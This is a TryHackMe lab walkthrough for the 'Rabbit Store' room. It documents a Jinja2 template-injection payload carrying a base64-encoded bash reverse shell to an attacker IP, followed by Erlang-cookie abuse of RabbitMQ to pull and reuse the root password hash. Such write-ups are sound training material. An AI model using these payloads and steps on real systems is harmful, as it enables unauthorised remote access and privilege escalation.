<h1 align="center">Rabbit Store</h1>
<p align="center">July 24, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>444</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/80c7232d-79a5-4446-98b4-da549c16b17c"><br>
Click <a href="https://tryhackme.com/room/rabbitstore">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/823066bb-d0dd-4f69-8b6e-d1faded9e959"></p>

<br>
<br>

<h2>Task 1 . Good luck!!!</h2>

<br>

<p><em>Answer the questions below</em></p>

<p>1.1. Let´s go!<br>
<code>No answer needed</code></p>

<br>

<h3>nmap</h3>

<p>

- <code>  22</code> : <code>ssh</code><br>
- <code>  80</code> : <code>http</code> : <code>Did not follow redirect to http://cloudsite.thm/</code><br>
- <code>4369</code> : <code>empd</code> : <code>ERland Port Mapper Daemon</code> : <code>rabbit:25672</code><br>
</p>

```bash
:~/RabbitStore# nmap -sC -sV -Pn -n -p- -T4 TargetIP
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
```

<h3>/etc/hosts</h3>

```bash
TargetIP   cloudsite.thm
```

<h3>Web 80</h3>

<p>

- <code>cloudsite.thm</code> redirects to <code>storage.cloudsite.thm</code> when clicking <code>Login/SignUp</code></p>

<img width="1055" height="318" alt="image" src="https://github.com/user-attachments/assets/5f166a9d-1d0b-4494-80f0-196b03e78fab" />

<img width="1057" height="248" alt="image" src="https://github.com/user-attachments/assets/8d730ee3-a4a6-43d4-9741-cd7bb6322b85" />

<h3>/etc/hosts</h3>

```bash
TargetIP   cloudsite.thm storage.cloudsite.thm
```

<h3>Login/SignUp</h3>

<img width="1063" height="639" alt="image" src="https://github.com/user-attachments/assets/9669a6dd-df01-4ec4-aeac-454b14d72a6c" />

<p>

- registered <code>researcher@mail.com</code>:<code>password</code>
</p>

<img width="1010" height="273" alt="image" src="https://github.com/user-attachments/assets/7f6d79fd-ddd2-4fc2-be47-b2422618a74b" />


<p>

- logged in as <code>researcher@mail.com</code> after launching <code>Burp Suite</code> and enabling <code>FoxyProxy</code><br>
- clicked over the <code>Request</code> panel, right-clicked <code>Do intercept</code>, <code>Response to this request</code><br>
- clicked <code>Forward</code><br<
- clicked <code>Forward</code> again<br>
- identified a <code>jwt</code><br>
- used <code>Inspector<code><br>
- identified "subscription":"<code>inactive</code>"<br>
- registered a new user through Burp<br>
- logged in through Burp = OK<br>
- logged also directly in the web = OK<br>
- landed in a web page woth <code>upload</code> feature: <code>Upload From Localhost</code>, <code>Upload From URL</code> and <code>Uploaded Files</code><br>
- inspecting its source, identified <code>/assets/js/custom_script_active.js</code.<br>
- opened it in a new tab<br>
- crafted a <code>hi.txt<code> file<br>
- loaded it through the <code>Upload From URl</code> functionality<br>
- navigated to the path of the uploaded file<br></p>

<img width="1143" height="306" alt="image" src="https://github.com/user-attachments/assets/c4d419b8-d584-4eea-a45d-5b5438f6f691" />

<img width="1053" height="489" alt="image" src="https://github.com/user-attachments/assets/bff367d6-ea52-4ec8-a277-fed301678994" />

<img width="1056" height="77" alt="image" src="https://github.com/user-attachments/assets/d3e494bd-a46c-4efc-85fe-dce751070654" />

<img width="1869" height="847" alt="image" src="https://github.com/user-attachments/assets/0f7fd8e1-004f-432a-9c38-6c06493ffbe7" />

<img width="1094" height="242" alt="image" src="https://github.com/user-attachments/assets/d21a19b6-1b04-4938-9dd6-12130e096f94" />

<img width="835" height="272" alt="image" src="https://github.com/user-attachments/assets/8364c00c-1f4e-4f35-a7ff-34c54d5d39e2" />

<img width="839" height="254" alt="image" src="https://github.com/user-attachments/assets/642e2b6d-3fb4-40ce-bf50-4b7610903487" />

<img width="1056" height="673" alt="image" src="https://github.com/user-attachments/assets/4aaec736-4ad2-4578-a592-f1da89795e60" />

<img width="739" height="267" alt="image" src="https://github.com/user-attachments/assets/493f8b88-ab1d-4856-93ad-2439da00ee31" />

<img width="1038" height="166" alt="image" src="https://github.com/user-attachments/assets/9d92d98a-0994-4636-8eb5-23ac22604470" />

<img width="1031" height="292" alt="image" src="https://github.com/user-attachments/assets/d762a5a8-f118-4544-b09e-110532a81c0b" />

<img width="1064" height="425" alt="image" src="https://github.com/user-attachments/assets/0409fb2b-c9bc-4917-8c81-fd24b815f0ff" />

<img width="1097" height="261" alt="image" src="https://github.com/user-attachments/assets/d3c06e94-16c5-45ed-a3bc-034857376d9c" />

<img width="1055" height="444" alt="image" src="https://github.com/user-attachments/assets/f1037780-1a35-487d-9079-49f15f8e53f0" />

<img width="1038" height="146" alt="image" src="https://github.com/user-attachments/assets/23ebd7ea-353a-4d57-839f-22dde8cdcecd" />

<img width="852" height="253" alt="image" src="https://github.com/user-attachments/assets/439e2278-9c4d-451e-ad72-b3c0bb8956cb" />

<br>
<br>

<img width="838" height="278" alt="image" src="https://github.com/user-attachments/assets/1b5c1259-2376-4353-93bb-64810afc3190" />

<br>
<br>

<img width="834" height="392" alt="image" src="https://github.com/user-attachments/assets/6ef83656-4d2f-4e2f-9170-4d077f09b33a" />


```bash
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Imx1bHVAbWFpbC5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTMzOTIyMzAsImV4cCI6MTc1MzM5NTgzMH0.XzNaRn9F-qgjPVWg9XuNvKaj4UVE-o1fiVZRO_iuNmA
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 155

{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNzcuMTMxLzQ0NDQgMD4mMQ== |base64 -d |bash').read() }}"}
```


```bash
:~/RabbitStore# nc -nlvp 4444
Listening on 0.0.0.0 4444
...
azrael@forge:~/chatbotServer$
```

```bash
azrael@forge:~$ ls
ls
chatbotServer
snap
user.txt
azrael@forge:~$ cat user.txt
cat user.txt
98d3a30fa86523c580144d317be0c47e
```

```bash
azrael@forge:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
```

```bash
rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
azrael@forge:~$ find / -type -name rabbitmq 2>&1 | grep -v 'Permission denied'
find / -type -name rabbitmq 2>&1 | grep -v 'Permission denied'
/usr/lib/rabbitmq
/usr/lib/ocf/resource.d/rabbitmq
/usr/share/rabbitmq
/var/log/rabbitmq
/var/lib/rabbitmq
/etc/rabbitmq
```


```bash
azrael@forge:~$ cd /var/lib/rabbitmq
cd /var/lib/rabbitmq
azrael@forge:/var/lib/rabbitmq$ ls
ls
config
erl_crash.dump
mnesia
nc
schema
```

```bash
azrael@forge:/var/lib/rabbitmq$ find / -type -name *erlang* 2>&1 | grep -v 'Permission denied'
<e -name *erlang* 2>&1 | grep -v 'Permission denied'
/usr/local/bin/generate_erlang_cookie.sh
/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/cuttlefish-3.0.1/priv/erlang_vm.schema
/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/rabbitmq_prelaunch-3.9.13/ebin/rabbit_prelaunch_erlang_compat.beam
/usr/lib/erlang
/usr/lib/erlang/releases/24/no_dot_erlang.script
/usr/lib/erlang/releases/24/no_dot_erlang.rel
/usr/lib/erlang/releases/24/no_dot_erlang.boot
/usr/lib/erlang/bin/no_dot_erlang.boot
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang-skels.el
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang-skels-old.el
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang-test.el
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang-edoc.el
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang-start.el
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang-flymake.el
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang-eunit.el
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang_appwiz.el
/usr/lib/erlang/lib/tools-3.5.2/emacs/erlang.el
/usr/lib/erlang/lib/erts-12.2.1/ebin/erlang.beam
/usr/share/pixmaps/erlang.xpm
/usr/share/menu/erlang-base
/usr/share/mime/text/x-erlang.xml
/usr/share/doc/erlang-asn1
/usr/share/doc/erlang-eldap
/usr/share/doc/erlang-tools
/usr/share/doc/erlang-inets
/usr/share/doc/erlang-xmerl
/usr/share/doc/erlang-syntax-tools
/usr/share/doc/erlang-ftp
/usr/share/doc/erlang-parsetools
/usr/share/doc/erlang-ssl
/usr/share/doc/erlang-crypto
/usr/share/doc/erlang-os-mon
/usr/share/doc/erlang-tftp
/usr/share/doc/erlang-mnesia
/usr/share/doc/erlang-base
/usr/share/doc/erlang-public-key
/usr/share/doc/erlang-runtime-tools
/usr/share/doc/erlang-snmp
/usr/share/apps/konsole/erlang.desktop
/var/lib/rabbitmq/.erlang.cookie
/var/lib/dpkg/info/erlang-mode.list
/var/lib/dpkg/info/erlang-ssl.list
/var/lib/dpkg/info/erlang-parsetools.md5sums
/var/lib/dpkg/info/erlang-crypto.md5sums
/var/lib/dpkg/info/erlang-base.prerm
/var/lib/dpkg/info/erlang-base.list
/var/lib/dpkg/info/erlang-crypto.list
/var/lib/dpkg/info/erlang-mnesia.md5sums
/var/lib/dpkg/info/erlang-parsetools.list
/var/lib/dpkg/info/erlang-snmp.md5sums
/var/lib/dpkg/info/erlang-snmp.list
/var/lib/dpkg/info/erlang-runtime-tools.md5sums
/var/lib/dpkg/info/erlang-tools.md5sums
/var/lib/dpkg/info/erlang-os-mon.md5sums
/var/lib/dpkg/info/erlang-asn1.list
/var/lib/dpkg/info/erlang-base.postrm
/var/lib/dpkg/info/erlang-eldap.list
/var/lib/dpkg/info/erlang-mnesia.list
/var/lib/dpkg/info/erlang-os-mon.list
/var/lib/dpkg/info/erlang-xmerl.list
/var/lib/dpkg/info/erlang-ftp.md5sums
/var/lib/dpkg/info/erlang-public-key.list
/var/lib/dpkg/info/erlang-base.postinst
/var/lib/dpkg/info/erlang-xmerl.md5sums
/var/lib/dpkg/info/erlang-inets.list
/var/lib/dpkg/info/erlang-asn1.md5sums
/var/lib/dpkg/info/erlang-syntax-tools.list
/var/lib/dpkg/info/erlang-tftp.list
/var/lib/dpkg/info/erlang-public-key.md5sums
/var/lib/dpkg/info/erlang-tools.list
/var/lib/dpkg/info/erlang-inets.md5sums
/var/lib/dpkg/info/erlang-ftp.list
/var/lib/dpkg/info/erlang-ssl.md5sums
/var/lib/dpkg/info/erlang-eldap.md5sums
/var/lib/dpkg/info/erlang-base.md5sums
/var/lib/dpkg/info/erlang-syntax-tools.md5sums
/var/lib/dpkg/info/erlang-tftp.md5sums
/var/lib/dpkg/info/erlang-runtime-tools.list
/etc/emacs/site-start.d/50erlang-mode.el
```

```bash
azrael@forge:/var/lib/rabbitmq$ cat .erlang.cookie
cat .erlang.cookie
WV9DEQ1Vp6jBplIs
```

```bash
azrael@forge:/var/lib/rabbitmq$ epmd -names
epmd -names
epmd: up and running on port 4369 with data:
name rabbit at port 25672
```

<h3>rabbitmqctl</h3>

```bash
:~/RabbitStore# apt install rabbitmq-server
...
```


<h3>rabbitmqctl | status</h3>

```bash
:~/RabbitStore# sudo rabbitmqctl --erlang-cookie 'WV9DEQ1Vp6jBplIs' --node rabbit@forge status
Status of node rabbit@forge ...
Runtime

OS PID: 1139
OS: Linux
Uptime (seconds): 11542
RabbitMQ version: 3.9.13
Node name: rabbit@forge
Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
Erlang processes: 530 used, 1048576 limit
Scheduler run queue: 0
Cluster heartbeat timeout (net_ticktime): 60

Plugins

Enabled plugin file: /etc/rabbitmq/enabled_plugins
Enabled plugins:

 * rabbitmq_management
 * amqp_client
 * rabbitmq_web_dispatch
 * cowboy
 * cowlib
 * rabbitmq_management_agent

Data directory

Node data directory: /var/lib/rabbitmq/mnesia/rabbit@forge

Config files

 * /etc/rabbitmq/rabbitmq.conf

Log file(s)

 * /var/log/rabbitmq/rabbit@forge.log
 * /var/log/rabbitmq/rabbit@forge_upgrade.log
 * <stdout>

Alarms

(none)

Memory

Calculation strategy: rss
Memory high watermark setting: 0.4 of available memory, computed to: 1.6207 gb
reserved_unallocated: 0.047 gb (33.82 %)
binary: 0.0395 gb (28.4 %)
code: 0.0353 gb (25.42 %)
other_proc: 0.0198 gb (14.22 %)
other_system: 0.0133 gb (9.59 %)
other_ets: 0.0034 gb (2.44 %)
connection_other: 0.0025 gb (1.77 %)
plugins: 0.0024 gb (1.7 %)
atom: 0.0014 gb (1.03 %)
mgmt_db: 0.0008 gb (0.57 %)
connection_readers: 0.0005 gb (0.33 %)
metrics: 0.0003 gb (0.22 %)
mnesia: 0.0001 gb (0.07 %)
connection_channels: 0.0001 gb (0.05 %)
quorum_ets: 0.0 gb (0.02 %)
queue_procs: 0.0 gb (0.02 %)
msg_index: 0.0 gb (0.02 %)
connection_writers: 0.0 gb (0.02 %)
stream_queue_procs: 0.0 gb (0.0 %)
stream_queue_replica_reader_procs: 0.0 gb (0.0 %)
allocated_unused: 0.0 gb (0.0 %)
queue_slave_procs: 0.0 gb (0.0 %)
quorum_queue_procs: 0.0 gb (0.0 %)
stream_queue_coordinator_procs: 0.0 gb (0.0 %)

File Descriptors

Total: 17, limit: 65439
Sockets: 15, limit: 58893

Free Disk Space

Low free disk space watermark: 0.05 gb
Free disk space: 5.6933 gb

Totals

Connection count: 15
Queue count: 1
Virtual host count: 1

Listeners

Interface: [::], port: 15672, protocol: http, purpose: HTTP API
Interface: [::], port: 25672, protocol: clustering, purpose: inter-node and CLI tool communication
Interface: 127.0.0.1, port: 5672, protocol: amqp, purpose: AMQP 0-9-1 and AMQP 1.0
```

<h3>/etc/hosts</h3>

```bash
TargetIP   cloudsite.thm storage.cloudsite.thm forge
```

<h3>rabbitmqctl | list_users</h3>

```bash
:~/RabbitStore# sudo rabbitmqctl --erlang-cookie 'WV9DEQ1Vp6jBplIs' --node rabbit@forge list_users
Listing users ...
user	tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.	[]
root	[administrator]
```

```bash
:~/RabbitStore# sudo rabbitmqctl --erlang-cookie 'WV9DEQ1Vp6jBplIs' --node rabbit@forge export_definitions /tmp/definitions.json
Exporting definitions in JSON to a file at "/tmp/definitions.json" ...
root@ip-10-10-177-131:~/RabbitStore# cat /tmp/definitions.json | jq '.users[] | select(.name == "root")'
{
  "hashing_algorithm": "rabbit_password_hashing_sha256",
  "limits": {},
  "name": "root",
  "password_hash": "49........aiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
  "tags": [
    "administrator"
  ]
}
```



```bash
:~/RabbitStore# echo -n '49........aiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100
e3d7ba85295d1d16a2617df6f7e6630527ff......5c43b3f6ec614811ed194f98073585
```

```bash
e3d7ba85295d1d16a2617df6f7e6630527ff......5c43b3f6ec614811ed194f98073585

e3d7ba85

295d1d16a2617df6f7e6630527ff......5c43b3f6ec614811ed194f98073585
```


```bash
azrael@forge:/var/lib/rabbitmq$ su root
su root
Password: 295d1d16a2617df6f7e6630527ff......5c43b3f6ec614811ed194f98073585
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
eabf7a0b05d3f........465d2fd0852
```

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/f79d299f-36d3-4655-bf9d-f6361be4144a"><br>
                 <img width="1200px" src="https://github.com/user-attachments/assets/d712184a-668b-49bf-a54f-61d1f0e15e9e"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>
<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 24, 2025     | 444      |     151ˢᵗ    |      5ᵗʰ     |    181ˢᵗ    |     7ᵗʰ    | 116,389  |    874    |    72     |

</div>

<p align="center">Global All Time:   151ˢᵗ<br><img width="400px" src="https://github.com/user-attachments/assets/03a2ceae-d52b-4d67-a1c0-8b5d0fd80c35"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/75bc531f-2f92-495a-b0ee-a8fa730f5615"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/eb765eab-606d-48f1-94a7-f6709e368d4a"><br>
                  Global monthly:    181ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/ea5a28a8-c30f-4535-9d16-fbe9fd5d6433"><br>
                  Brazil monthly:      8ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/ec5eaba8-bded-4a72-849a-8f3b8c634acb"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
<br>
<h1 align="center">Thank you very much ...</h1>
<p><a href="https://tryhackme.com/p/tryhackme">TryHackMe</a> and <a href="https://tryhackme.com/p/iklak">iklak</a><br>for developinng this experience so that I could sharpen my skills!</p>
